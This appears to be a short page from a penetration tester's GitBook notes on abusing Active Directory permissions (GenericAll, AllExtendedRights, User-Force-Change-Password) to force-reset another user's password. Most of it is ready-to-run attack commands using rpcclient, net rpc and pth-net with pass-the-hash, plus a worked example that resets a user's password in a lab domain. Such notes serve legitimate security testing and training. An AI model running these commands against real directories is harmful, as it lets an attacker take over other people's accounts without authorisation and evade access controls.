# ForcePasswordChange

This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user.

{% embed url="https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword" %}

### Bloodhound Analysis

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Commands

{% code overflow="wrap" %}
```bash
# rpcclient 
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword

Kali> rpcclient -U lab.trusted.vl/rsmith labdc.lab.trusted.vl
rpcclient $> setuserinfo2 ewalters 23 Password0-


# With net and cleartext credentials (will be prompted)
net rpc password $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController

# With Pass-the-Hash
pth-net rpc password $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
```
{% endcode %}
